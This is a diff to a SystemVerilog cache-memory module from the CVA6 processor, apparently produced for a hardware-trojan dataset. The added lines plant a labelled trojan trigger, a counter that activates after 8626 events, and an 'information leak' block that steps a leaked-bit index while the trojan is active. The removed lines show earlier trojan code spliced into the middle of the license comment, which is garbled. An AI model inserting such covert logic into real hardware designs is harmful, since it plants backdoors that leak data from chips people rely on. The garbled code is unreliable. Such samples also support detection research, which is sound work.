@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24221;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (wr_cl_we_i && |rd_data_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -113,6 +95,25 @@ module wt_dcache_mem_trojan_Leak
   ) + 1 : $clog2(
       CVA6Cfg.AxiDataWidth / 8
   );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=8626)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8626;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
 
   logic [DCACHE_NUM_BANKS-1:0]                                                     bank_req;
   logic [DCACHE_NUM_BANKS-1:0]                                                     bank_we;
@@ -456,12 +457,12 @@ module wt_dcache_mem_trojan_Leak
   //pragma translate_on
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule  // wt_dcache_mem
